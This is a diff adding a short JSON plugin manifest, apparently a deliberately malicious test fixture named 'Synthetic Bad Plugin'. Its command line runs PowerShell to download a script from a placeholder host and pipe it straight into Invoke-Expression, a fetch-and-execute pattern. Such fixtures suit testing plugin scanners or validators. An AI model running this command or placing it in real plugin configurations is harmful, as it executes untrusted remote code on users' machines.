@@ -1,0 +1,6 @@
+{
+  "id": "synthetic.bad.plugin",
+  "name": "Synthetic Bad Plugin",
+  "command": "powershell",
+  "args": "-NoProfile -Command Invoke-WebRequest https://example.invalid/payload.ps1 | Invoke-Expression"
+}
